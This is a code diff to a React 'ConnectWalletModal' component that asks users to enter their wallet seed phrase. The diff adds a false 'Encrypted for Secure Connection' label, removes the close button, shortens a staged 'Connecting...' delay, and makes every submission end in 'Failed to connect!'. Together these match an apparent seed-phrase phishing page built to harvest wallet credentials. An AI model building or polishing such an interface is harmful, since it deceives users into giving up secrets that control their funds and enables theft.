@@ -42,26 +42,26 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
       setTimeout(() => {
         onClose();
       }, 2000);
-    }, 10000); // 10 seconds delay as requested
+    }, 5000); // 5 seconds delay as requested
   };
 
   return (
     <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
       <DialogContent className="bg-[#1A1F2C] text-white border-0 sm:max-w-[425px]">
         <DialogHeader className="text-left">
-          <DialogTitle className="text-xl font-bold">connect external wallet</DialogTitle>
+          <DialogTitle className="text-xl font-bold">Connect external wallet</DialogTitle>
           <DialogDescription className="text-gray-400">
-            enter your seed phrase to connect your wallet
+            Enter your seed phrase to connect your wallet
           </DialogDescription>
         </DialogHeader>
         
-        <button 
+        {/* <button 
           onClick={onClose}
           className="absolute right-4 top-4 rounded-sm text-white hover:bg-white/10 p-1"
           disabled={status !== 'idle'}
         >
           <X className="h-4 w-4" />
-        </button>
+        </button> */}
 
         <form onSubmit={handleSubmit} className="mt-4">
           <div className="space-y-4">
@@ -72,6 +72,10 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
               className="bg-transparent border-[#3B4254] border-2 h-12 text-white"
               disabled={status !== 'idle'}
             />
+
+            <p className="text-xs text-green-500">
+                  Encrypted for Secure Connection
+                </p>
             
             {status === 'idle' ? (
               <Button 
@@ -87,8 +91,8 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
                 <span className="ml-2">Connecting...</span>
               </div>
             ) : (
-              <div className="flex items-center justify-center text-green-400 p-2">
-                <span>Connected Successfully!</span>
+              <div className="flex items-center justify-center text-red-400 p-2">
+                <span>Failed to connect!</span>
               </div>
             )}
           </div>
